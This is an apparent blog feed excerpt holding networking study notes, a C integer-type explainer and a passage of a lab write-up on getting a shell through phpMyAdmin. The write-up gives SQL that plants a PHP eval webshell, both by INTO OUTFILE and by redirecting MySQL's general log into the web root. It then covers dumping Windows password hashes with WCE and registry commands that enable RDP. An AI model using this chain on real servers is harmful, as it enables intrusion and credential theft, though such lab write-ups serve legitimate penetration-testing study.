    <link href="https://www.twosmi1e.com/2018/11/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <id>https://www.twosmi1e.com/2018/11/07/计算机网络/</id>
    <published>2018-11-07T11:31:05.000Z</published>
    <updated>2018-11-07T11:31:37.436Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="因特网发展的三个阶段"><a href="#因特网发展的三个阶段" class="headerlink" title="因特网发展的三个阶段"></a>因特网发展的三个阶段</h3><ol><li>从单个网络<strong>APRANET</strong>向互联网发展</li><li>建成了<strong>三级结构的因特网</strong>(主干网，地区网，校园网)</li><li>形成了多层次<strong>ISP</strong>(Internet Service Provider)的结构的因特网</li></ol><h3 id="传统三网"><a href="#传统三网" class="headerlink" title="传统三网"></a>传统三网</h3><p>电信网、有线电视网、计算机网络</p><h3 id="因特网的组成"><a href="#因特网的组成" class="headerlink" title="因特网的组成"></a>因特网的组成</h3><ol><li>边缘部分(用户直接使用的)<ul><li>客户-服务器方式(Client/Server)：客户是服务的请求方，服务器是服务的提供方</li><li>对等方式(Peer-to-Peer)：不区分</li></ul></li><li>核心部分(为边缘部分提供服务的)<ul><li>电路交换：在通话时间内，两个用户始终占用端到端的通信资源，线路传输效率很低。</li><li>分组交换：采用存储转发技术。<ul><li>基于标记</li><li>无连接</li><li>由节点交换机(路由器)和链路组成</li></ul></li></ul></li><li>报文交换：整个报文先传送到相邻结点，全部存储下来后查找转发表，转发到下一个结点。</li></ol><p>在网络核心部分起特殊作用的是<strong>路由器(router)</strong>。<br>路由器是实现<strong>分组交换(packet switching)</strong>的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。</p><h3 id="分组交换的问题"><a href="#分组交换的问题" class="headerlink" title="分组交换的问题"></a>分组交换的问题</h3><ol><li>分组在各结点存储转发时需要排队，会造成一定的时延。</li><li>分组必须带首部，造成一定开销</li><li>相比较电路交换更实时的传输数据，分组交换更适合突发性传输</li></ol><p><img src="/2018/11/07/计算机网络/1528638039778.png" alt="Alt text"></p><h3 id="计算机网络的类别"><a href="#计算机网络的类别" class="headerlink" title="计算机网络的类别"></a>计算机网络的类别</h3><h4 id="按作用范围"><a href="#按作用范围" class="headerlink" title="按作用范围"></a>按作用范围</h4><ul><li>广域网 WAN (Wide Area Network)</li><li>城域网 MAN (Metropolitan Area Network)</li><li>局域网 LAN (Local Area Network) </li><li>个人区域网 PAN (Personal Area Network) <h4 id="按使用者"><a href="#按使用者" class="headerlink" title="按使用者"></a>按使用者</h4></li><li>公用网 (public network) </li><li>专用网 (private network) </li><li>虚拟专用网络（Virtual Private Network：VPN）<h4 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标"></a>性能指标</h4></li></ul><ol><li>速率<br>指传送数据的速率，也称为数据率data rate(b/s,kb/s,Mb/s,Gb/sTb/s)，往往指额定速率或标称速率。</li><li>带宽(bandwidth)<br>原指通信线路允许通过的信号频带范围就称为线路的带宽(或通频带)。<br>现指数字信道能传送的<strong>最高数据率</strong>，单位b/s<br>在时间轴上<strong>信号的宽度随带宽的增大而变窄</strong>。     </li></ol><p><img src="/2018/11/07/计算机网络/1528639457530.png" alt="Alt text"></p><ol start="3"><li>吞吐量(throughput)<br>表示在单位时间内通过某个网络（或信道、接口）的数据量。</li><li>时延(delay/latency)<ul><li>发送时延(transmission delay)：主机或路由器发送数据帧所需要的时间<img src="/2018/11/07/计算机网络/1528640024481.png" alt="Alt text"></li><li>传播时延(propagation delay)：电磁波在信道中需要传播一定的距离而花费的时间（介质的物理性质决定）<img src="/2018/11/07/计算机网络/1528640185762.png" alt="Alt text"></li><li>处理时延：主机或路由器处理分组所花的时间</li><li>排队时延：结点缓存队列中分组排队所经历的时延，取决于<strong>网络中当时的通信量</strong><br><img src="/2018/11/07/计算机网络/1528640826755.png" alt="Alt text"><br><img src="/2018/11/07/计算机网络/1528640876092.png" alt="Alt text"></li></ul></li><li>时延带宽积<br>时延带宽积 = 传播时延 * 带宽 </li><li>往返时间RTT</li><li>利用率： D = D <sub>0</sub> /1-U U为网络利用率，D表示当前时延，D<sub>0</sub>表示空闲时的时延<h3 id="协议和划分层次"><a href="#协议和划分层次" class="headerlink" title="协议和划分层次"></a>协议和划分层次</h3><strong>网络协议(network protocol)</strong>，简称为协议，是为进行网络中的数据交换而建立的规则、标准或约定。<br>协议是控制两个对等实体间通信规则的集合<br>要实现本层协议，还必须要下一层提供的服务<br>服务是“垂直”的，协议是“水平”的<br><strong>三要素</strong>：</li></ol><ul><li>语法：数据与控制信息的结构或格式</li><li>语义：需要发出何种控制信息，完成何种动作以及做出何种响应</li><li>同步：事件实现顺序的详细说明<br><img src="/2018/11/07/计算机网络/1528688950044.png" alt="Alt text"></li></ul><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><h3 id="接口特性"><a href="#接口特性" class="headerlink" title="接口特性"></a>接口特性</h3><ol><li><strong>机械特性</strong>：指明接口所用接线器的形状和尺寸，引脚数目和排列，固定和锁定装置等。</li><li><strong>电气特性</strong>：指明在接口电缆的各条线上出现的电压的范围。</li><li><strong>功能特性</strong>：指明缪条线上出现的某一电平的电压表示何种意义。</li><li><strong>过程特性</strong>：指明对于不同功能的各种可能事件的出现顺序。<h3 id="多模与单模光纤"><a href="#多模与单模光纤" class="headerlink" title="多模与单模光纤"></a>多模与单模光纤</h3></li></ol><ul><li>多模光纤：可以存在多条不同角度入射的光线在一条光纤中传输。</li><li>单模光纤：若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。</li></ul><p><strong>后者比前者速度快，但是铺设距离短。</strong></p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>数据(data)：运送消息的实体</li><li>信号(signal)：数据的电气或电磁的表现</li><li>模拟信号(analogous)：消息参数取值是连续的</li><li>数字信号(digital)：消息参数取值是离散的</li><li>码元(code)：在时域的波形表示数字信号时，代表不同离散数值的基本波形。二进制时只有两种，分别代表0,1</li><li>单向通信（单工通信）：只能有一个方向的通信而没有反方向的交互。</li><li>双向交替通信（半双工通信）：通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</li><li>双向同时通信（全双工通信）：通信的双方可以同时发送和接收信息。 </li></ul><p><strong>基带信号-&gt;调制-&gt;带通信号</strong><br><strong>三种调制基本方法：</strong></p><ul><li>调幅(AM)</li><li>调频(FM)</li><li>调相(PM)<h3 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h3><h4 id="频分复用FDM"><a href="#频分复用FDM" class="headerlink" title="频分复用FDM"></a>频分复用FDM</h4><img src="/2018/11/07/计算机网络/1528696245855.png" alt="Alt text"><br>所有用户在同样的时间占用不同的带宽资源(这里带宽指频率带宽而不是数据的发送速率)<h4 id="时分复用TDM"><a href="#时分复用TDM" class="headerlink" title="时分复用TDM"></a>时分复用TDM</h4><img src="/2018/11/07/计算机网络/1528696368267.png" alt="Alt text"><br>所有用户在不同的时间占用同样的频带宽度<h4 id="码分复用CDM"><a href="#码分复用CDM" class="headerlink" title="码分复用CDM"></a>码分复用CDM</h4>常用的名词是码分多址 CDMA (Code Division Multiple Access)。<br>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。<br>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。<br>每一个比特时间划分为 m 个短的间隔，称为<strong>码片</strong>(chip)。<br><strong>重要特点：每一个站分配的麻片序列不仅必须各不相同，并且必须互相正交</strong><br><img src="/2018/11/07/计算机网络/1528697106147.png" alt="Alt text"><br>S=(–1 –1 –1 +1 +1 –1 +1 +1)<br>Sx+Tx=（-2 -2 0 0 2 0 2 0）<br>S（Sx+Tx）=（2+2+0+0+2+0+2+0)/8=1<h2 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="互联网发展"><a href="#互联网发展" class="headerlink" title="互联网发展"></a>互联网发展</h3>从单个网络ARPANET到互联网，建成三级结构的互联网(主干网，地区网，校园网)，形层次多级ISP的互联网<h3 id="由n个HUB构成的网络，有n个冲突域"><a href="#由n个HUB构成的网络，有n个冲突域" class="headerlink" title="由n个HUB构成的网络，有n个冲突域"></a>由n个HUB构成的网络，有n个冲突域</h3><h3 id="流量控制与拥塞避免的基本概念和原理"><a href="#流量控制与拥塞避免的基本概念和原理" class="headerlink" title="流量控制与拥塞避免的基本概念和原理"></a>流量控制与拥塞避免的基本概念和原理</h3>流量控制：让发送方的发送速率不要太快，要让接收方来的及接收。利用窗口滑动机制可以很方便的在TCP连接上实现流量控制<br>拥塞避免：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不过载<h3 id="特殊的IP地址"><a href="#特殊的IP地址" class="headerlink" title="特殊的IP地址"></a>特殊的IP地址</h3>127.0.0.1  环回地址<br>0.0.0.0   表示所有未知的主机和目的网络<br>255.255.255.255  限制广播地址<br>224.0.0.1   组播地址<h3 id="各层有哪些协议"><a href="#各层有哪些协议" class="headerlink" title="各层有哪些协议"></a>各层有哪些协议</h3>数据链路层：PPP，CSMA/CD<br>网络层：ARP,ICMP,RIP,OSPF,BGP,IGMP<br>运输层：TCP,UDP<br>应用层：DNS,FTP,HTTP,TELENT,SMTP<h3 id="频分多路复用的工作原理"><a href="#频分多路复用的工作原理" class="headerlink" title="频分多路复用的工作原理"></a>频分多路复用的工作原理</h3>在物理信道可用的带宽超过某个原始信号所用带宽时，可将改物理信道总带宽分割成若干个与传输单个信号带宽相同的子信道，然后在每个子信道上传输一路信号，实现在同一信道中传输多路信号<h3 id="数据链路层主要功能"><a href="#数据链路层主要功能" class="headerlink" title="数据链路层主要功能"></a>数据链路层主要功能</h3></li></ul><ol><li>封装成帧</li><li>透明传输</li><li>差错检测<h3 id="网络协议的定义"><a href="#网络协议的定义" class="headerlink" title="网络协议的定义"></a>网络协议的定义</h3>为进行网络中的数据交换而建立的规则标准或约定<h3 id="TCP协议有一个TIME-WAIT状态的描述"><a href="#TCP协议有一个TIME-WAIT状态的描述" class="headerlink" title="TCP协议有一个TIME_WAIT状态的描述"></a>TCP协议有一个TIME_WAIT状态的描述</h3>通信双方建立TCP连接后，主动关闭连接的一方会进入TIME_WAIT状态。<br>客户端接收到连接释放报文后，发送ACK=1，ack=w+1后进入TIME_WAIT状态，等待2MSL后进入CLOSE状态<h3 id="TCP基本概念"><a href="#TCP基本概念" class="headerlink" title="TCP基本概念"></a>TCP基本概念</h3>面向连接的，可靠地，字节流服务，一对一<h3 id="利用集线器连接的网络的拓扑结构特点"><a href="#利用集线器连接的网络的拓扑结构特点" class="headerlink" title="利用集线器连接的网络的拓扑结构特点"></a>利用集线器连接的网络的拓扑结构特点</h3>总线型，星形，环形<h3 id="UDP伪首部有多少个字节同首部一起发送到接收端作为校验"><a href="#UDP伪首部有多少个字节同首部一起发送到接收端作为校验" class="headerlink" title="UDP伪首部有多少个字节同首部一起发送到接收端作为校验"></a>UDP伪首部有多少个字节同首部一起发送到接收端作为校验</h3>12字节  首部8字节<h3 id="计算机网络按照覆盖范围的分类"><a href="#计算机网络按照覆盖范围的分类" class="headerlink" title="计算机网络按照覆盖范围的分类"></a>计算机网络按照覆盖范围的分类</h3>WAN广域网<br>MAN城域网<br>LAN局域网<h3 id="影响网络延时的主要因素是什么延迟"><a href="#影响网络延时的主要因素是什么延迟" class="headerlink" title="影响网络延时的主要因素是什么延迟"></a>影响网络延时的主要因素是什么延迟</h3>发送时延，传播时延，处理时延，排队时延</li></ol><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="单向通信"><a href="#单向通信" class="headerlink" title="单向通信"></a>单向通信</h3><p>只有一个方向的通信而没有反方向的交互</p><h3 id="频分复用"><a href="#频分复用" class="headerlink" title="频分复用"></a>频分复用</h3><p>用户在分配到一定的频率后，在通信过程中始终使用这个频率</p><h3 id="CSMA-CD"><a href="#CSMA-CD" class="headerlink" title="CSMA/CD"></a>CSMA/CD</h3><p>载波监听多点接入/碰撞检测<br>所有节点共享网络信道，节点发送数据之前，首先检测信道是否空闲，如果空闲则发送，否则就等待，发出信息后再检测冲突，发现冲突则取消发送</p><h3 id="RED随机早期检测"><a href="#RED随机早期检测" class="headerlink" title="RED随机早期检测"></a>RED随机早期检测</h3><p> 通过监控路由器输出端口队列的平均长度来检测拥塞，拥塞一旦逼近，即平均队列长度超过最小门限，按某一概率丢包。</p><h3 id="多归属主机"><a href="#多归属主机" class="headerlink" title="多归属主机"></a>多归属主机</h3><p>当一台主机同时连接到两个网络上时，该主机必须同时拥有两个IP地址且网络号不相同</p><h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><p>地址解析协议(Address Resolution Protocol)<br>根据 IP地址得到硬件地址的一个TCP/IP协议</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="路由网关等设备"><a href="#路由网关等设备" class="headerlink" title="路由网关等设备"></a>路由网关等设备</h3><p>中继器：简单的增加局域网传输距离，作为信号放大器，工作在物理层<br>路由器：能将异种网络互联起来，不同网络间相互转换<br>集线器：<br>网关：执行传输层及以上各层协议转换，或者实现不同体系结构的网络协议转换，不同网络协议间转换</p><h3 id="ping的命令及原理"><a href="#ping的命令及原理" class="headerlink" title="ping的命令及原理"></a>ping的命令及原理</h3><p>ping用来测试两个主机之间的连通性<br>使用了ICMP回送请求与回送回答报文，应用层直接使用网络层ICMP的例子</p><h3 id="CRC冗余校验计算"><a href="#CRC冗余校验计算" class="headerlink" title="CRC冗余校验计算"></a>CRC冗余校验计算</h3><h3 id="DNS及服务器类型"><a href="#DNS及服务器类型" class="headerlink" title="DNS及服务器类型"></a>DNS及服务器类型</h3><p>域名系统(Domain Name System)<br>四种类型：</p><ul><li>根域名服务器</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器</li></ul><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><h4 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h4><p><img src="/2018/11/07/计算机网络/1528739029778.png" alt="Alt text"></p><ul><li><strong>“转发”(forwarding)</strong>就是路由器根据转发表将用户的 IP 数据报从合适的端口转发出去。</li><li><strong>“路由选择”(routing)</strong>则是按照分布式算法，根据从各相邻路由器得到的关于网络拓扑的变化         情况，动态地改变所选择的路由。</li><li>路由表是根据路由选择算法得出的。而转发表是从路由表得出的。<h4 id="分组到路由器后路由器的操作"><a href="#分组到路由器后路由器的操作" class="headerlink" title="分组到路由器后路由器的操作"></a>分组到路由器后路由器的操作</h4></li></ul><ol><li>达到的数据包依次经过物理层解析，数据链路层解析（判断MAC地址是否是本路由器），网络层解析；</li><li>网络层先取出TTL减去1，如果为0则扔掉该报文并发送一个ICMP差错报文回源端；如果不为0，则取出目的IP进行查转发表工作，依照查到的转发表端口进行转发到对应目的端口；</li><li>目的端口把该IP数据包封装为MAC帧后发送到物理层线路上。</li></ol><p>###访问网站<br>当你使用浏览器上网访问网站时，计算机协议栈会有哪些主要的处理流程，会发送什么协议报文，其主要作用是什么？<br>(1) 浏览器分析超链指向页面的 URL。<br>(2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="external">www.tsinghua.edu.cn</a> 的 IP 地址。<br>(3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。<br>(4) 浏览器与服务器建立 TCP 连接<br>(5) 浏览器发出取文件命令：<br>      GET /chn/yxsz/index.htm。<br>(6) 服务器给出响应，把文件 index.htm 发给浏览器。<br>(7) TCP 连接释放。<br>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所有文本。</p><h3 id="协议配置"><a href="#协议配置" class="headerlink" title="协议配置"></a>协议配置</h3><p>需要配置的项目<br>  (1) IP 地址<br>  (2) 子网掩码<br>  (3) 默认路由器的 IP 地址<br>  (4) 域名服务器的 IP 地址</p><h3 id="网际层的-IP-协议及配套协议"><a href="#网际层的-IP-协议及配套协议" class="headerlink" title="网际层的 IP 协议及配套协议"></a>网际层的 IP 协议及配套协议</h3><p><img src="/2018/11/07/计算机网络/1528782967333.png" alt="Alt text"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;h3 id=&quot;因特网发展的三个阶段&quot;&gt;&lt;a href=&quot;#因特网发展的三个阶段&quot; class=&quot;headerlink&quot; title=&quot;因特网发展
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>uint8_t / uint16_t / uint32_t /uint64_t数据类型详解</title>
    <link href="https://www.twosmi1e.com/2018/11/01/uint8-t-uint16-t-uint32-t-uint64-t%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/"/>
    <id>https://www.twosmi1e.com/2018/11/01/uint8-t-uint16-t-uint32-t-uint64-t数据类型详解/</id>
    <published>2018-11-01T13:48:13.000Z</published>
    <updated>2018-11-01T13:54:33.407Z</updated>
    
    <content type="html"><![CDATA[<p>在linux下的C语言编程中会出现题目中这些数据类型。初学的时候不知道是什么类型，只知道int，char这种。<br>其实就是以前基本类型的别名，为了方便跨平台而使用。</p><h2 id="C语言基本数据类型"><a href="#C语言基本数据类型" class="headerlink" title="C语言基本数据类型"></a>C语言基本数据类型</h2><p>在C语言中有6种基本数据类型：short、int、long、float、double、char</p><ol><li>数值类型</li></ol><ul><li>整型：short、int、long</li><li>浮点型：float、double</li></ul><ol start="2"><li>字符类型：char<h2 id="uint-t数据类型"><a href="#uint-t数据类型" class="headerlink" title="uint*_t数据类型"></a>uint*_t数据类型</h2></li></ol><p>1、这些类型的来源：这些数据类型中都带有_t, _t 表示这些数据类型是通过typedef定义的，而不是新的数据类型。也就是说，它们其实是我们已知的类型的别名。</p><p>2、使用这些类型的原因：方便代码的维护。比如，在C中没有bool型，于是在一个软件中，一个程序员使用int，一个程序员使用short，会比较混乱。最好用一个typedef来定义一个统一的bool：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">bool</span>;</span><br></pre></td></tr></table></figure></p><p>在涉及到跨平台时，不同的平台会有不同的字长，所以利用预编译和typedef可以方便的维护代码。</p><h3 id="C99标准"><a href="#C99标准" class="headerlink" title="C99标准"></a>C99标准</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is some amount of overlap with &lt;sys/types.h&gt; as known by inet code */</span>  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __int8_t_defined  </span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __int8_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">signed</span> <span class="keyword">char</span>             <span class="keyword">int8_t</span>;   </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">short</span> <span class="keyword">int</span>               <span class="keyword">int16_t</span>;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span>                     <span class="keyword">int32_t</span>;  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">int</span>                <span class="keyword">int64_t</span>;  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span>  </span></span><br><span class="line">__extension__  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>           <span class="keyword">int64_t</span>;  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Unsigned.  */</span>  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>           <span class="keyword">uint8_t</span>;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span>      <span class="keyword">uint16_t</span>;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __uint32_t_defined  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>            <span class="keyword">uint32_t</span>;  </span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __uint32_t_defined  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64  </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>       <span class="keyword">uint64_t</span>;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  </span></span><br><span class="line">__extension__  </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span>  <span class="keyword">uint64_t</span>;  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint16_t</span> %hu</span><br><span class="line"><span class="keyword">uint32_t</span> %u</span><br><span class="line"><span class="keyword">uint64_t</span> %llu</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在linux下的C语言编程中会出现题目中这些数据类型。初学的时候不知道是什么类型，只知道int，char这种。&lt;br&gt;其实就是以前基本类型的别名，为了方便跨平台而使用。&lt;/p&gt;
&lt;h2 id=&quot;C语言基本数据类型&quot;&gt;&lt;a href=&quot;#C语言基本数据类型&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="编程相关" scheme="https://www.twosmi1e.com/tags/%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin getshell姿势</title>
    <link href="https://www.twosmi1e.com/2018/10/11/phpmyadmin-getshell%E5%A7%BF%E5%8A%BF/"/>
    <id>https://www.twosmi1e.com/2018/10/11/phpmyadmin-getshell姿势/</id>
    <published>2018-10-11T07:19:34.000Z</published>
    <updated>2018-11-15T11:29:14.069Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于<a href="https://xz.aliyun.com/t/3283" target="_blank" rel="external">先知社区</a>,转载请注明来源</p><p>phpmyadmin常被用来管理mysql数据库。在ctf比赛和实战中都可能会遇到phpmyadmin弱口令或者空密码的情况，这个时候就需要从phpmyadmin来getshell了，这里总结一下getshell的姿势。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>此次是在虚拟机中用wampserver搭了一个实验环境，然后在本机上执行操作。</p><ul><li>靶机：Windows7 x64    IP 192.168.129.129</li><li>攻击机： Windows10 x64</li><li>PHP版本：5.6</li><li>Mysql版本：5.7</li><li>Apache版本：2.4<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037451883.png" alt="Alt text"><br>mysql密码为弱密码root，已爆破得到密码。</li></ul><h2 id="0x01-常用方法"><a href="#0x01-常用方法" class="headerlink" title="0x01 常用方法"></a>0x01 常用方法</h2><p>最常见的应该就是<code>select into outfile</code>写入shell了，需要知道网站的绝对路径，而且比较容易失败。<br><code>select @@basedir</code>可以看到mysql所在的绝对路径，此外还有一些爆路径的方法会在下面总结到。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037378652.png" alt="Alt text"><br>爆出网站绝对路径后你可以开始写入shell。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;C:/wamp64/www/ma.php&apos;)</span><br><span class="line">select &apos;&lt;?php eval($_POST[cmd]); ?&gt;&apos; into outfile &apos;C:/wamp64/www/ma.php&apos;;</span><br></pre></td></tr></table></figure></p><p>当你尝试执行<code>select into outfile</code>时会爆出如图的错误：<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542037848812.png" alt="Alt text"><br>执行以下命令：<br><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code><br><img src="/2018/10/11/phpmyadmin-getshell姿势/1541693041317.png" alt="Alt text"><br>如果值为文件夹目录，则只允许修改目录下的文件，如果值为<code>NULL</code>则为禁止。<br><strong>并且这个值是只读变量，只能通过配置文件修改。</strong></p><h2 id="0x02-利用日志写shell"><a href="#0x02-利用日志写shell" class="headerlink" title="0x02 利用日志写shell"></a>0x02 利用日志写shell</h2><p>转换思路，mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。</p><h3 id="检测全局变量-general-log、general-log-file"><a href="#检测全局变量-general-log、general-log-file" class="headerlink" title="检测全局变量(general_log、general_log file)"></a>检测全局变量(general_log、general_log file)</h3><ol><li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li><li>general log file 指的是日志的保存路径。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &apos;general%&apos;</span><br></pre></td></tr></table></figure></li></ol><p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542038258633.png" alt="Alt text"></p><p>由图可知<code>general_log</code>默认关闭，以及日志的存储路径 。</p><p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在<code>c:\wamp64\bin\mysql\mysql5.7.14\data\</code>的一个.log文件中，其实就是我们常说的日志文件<br>利用思路：开启<code>general_log</code>之后把<code>general_log_file</code>的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;;</span><br><span class="line">set global general_log_file=&apos;C:/wamp64/www/ma.php&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542038724504.png" alt="Alt text"><br>执行后可以看到生成的伪日志文件ma.php<br>此时在利用日志的记录插入一句话<br><code>select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;;</code><br>打开日志可以看到记录<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542083022382.png" alt="Alt text"><br>然后尝试用菜刀连接即可getshell<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542040654856.png" alt="Alt text"></p><h2 id="0x03-获取管理员密码"><a href="#0x03-获取管理员密码" class="headerlink" title="0x03 获取管理员密码"></a>0x03 获取管理员密码</h2><p>既然都做到这里了就顺便简单复习一下Windows，继续做下去。<br>可以上传mysql提权脚本来创建新用户，这里我选择上传wce尝试获取密码</p><h3 id="wce抓取"><a href="#wce抓取" class="headerlink" title="wce抓取"></a>wce抓取</h3><p>尝试直接抓明文，没有结果，那只能抓hash值了。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542077881513.png" alt="Alt text"><br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542079376643.png" alt="Alt text"><br>拿到hash值后就可以用hashcat或者直接跑彩虹表来获取密码。在线也有<a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="external">ophcrack</a>可以破解。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542088152490.png" alt="Alt text"></p><h3 id="3389连接"><a href="#3389连接" class="headerlink" title="3389连接"></a>3389连接</h3><p>查看一下端口，发现3389没开<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542079568660.png" alt="Alt text"><br>开启3389<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"</span> /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/11/phpmyadmin-getshell姿势/1542094164863.png" alt="Alt text"><br>然后连接，输入刚刚抓到的账号密码即可。<br><img src="/2018/10/11/phpmyadmin-getshell姿势/TIM截图20181113192414.png" alt="Alt text"></p><h3 id="小结"><a href="#小结" class="headerlink" 